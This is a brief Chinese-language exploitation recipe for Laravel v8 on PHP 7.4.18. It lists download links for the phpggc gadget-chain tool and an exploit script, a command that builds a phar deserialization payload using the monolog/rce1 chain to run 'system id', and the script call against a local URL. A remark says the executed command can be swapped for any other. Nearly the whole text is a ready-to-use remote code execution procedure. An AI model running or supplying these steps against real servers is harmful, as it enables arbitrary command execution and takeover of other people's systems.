# Laravel v8 (PHP v7.4.18)

```bash
1. 下载phpggc
https://github.com/ambionics/phpggc
下面的代码示例是下载到了/opt
2. 下载py脚本
https://github.com/ambionics/laravel-exploits
3. 生成php反序列化char文件
php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o id.phar --fast-destruct monolog/rce1 system id
最后的id是命令，可以修改
4. 利用脚本
python3 exp.py http://127.0.0.1:8000 /opt/phpggc/id.phar  
```
